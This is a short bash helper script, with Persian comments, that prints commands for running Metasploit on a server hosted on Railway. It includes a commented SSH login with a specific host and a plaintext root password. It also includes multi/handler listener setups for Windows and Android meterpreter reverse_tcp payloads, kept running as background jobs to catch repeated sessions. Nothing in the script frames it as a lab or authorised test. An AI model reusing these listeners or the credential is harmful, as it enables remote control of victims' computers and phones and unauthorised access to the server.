#!/bin/bash
# Quick commands for using Metasploit on Railway

# اتصال SSH
# ssh -p 55001 root@crossover.proxy.rlwy.net
# Password: 8181

# بعد از اتصال، این دستورات رو اجرا کن:

# روش 1: استفاده از wrapper script
echo "=== Method 1: Using wrapper script ==="
echo "/run-msf.sh"
echo ""

# روش 2: استفاده مستقیم از bundle exec
echo "=== Method 2: Direct bundle exec ==="
echo "cd /usr/src/metasploit-framework"
echo "bundle exec ruby ./msfconsole"
echo ""

# روش 3: راه‌اندازی handler ها
echo "=== Method 3: Start handlers ==="
echo "cd /usr/src/metasploit-framework"
echo "bundle exec ruby ./msfconsole -r /home/msfuser/handler.rc"
echo ""

# چک کردن log
echo "=== Check logs ==="
echo "tail -f /var/log/msf.log"
echo ""

# Handler های دستی
echo "=== Manual handlers (در msfconsole) ==="
cat << 'EOF'
# Windows handler
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j -z

# Android handler  
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 8080
set ExitOnSession false
exploit -j -z

# چک کردن jobs
jobs

# کشتن job
kill JOB_ID
EOF
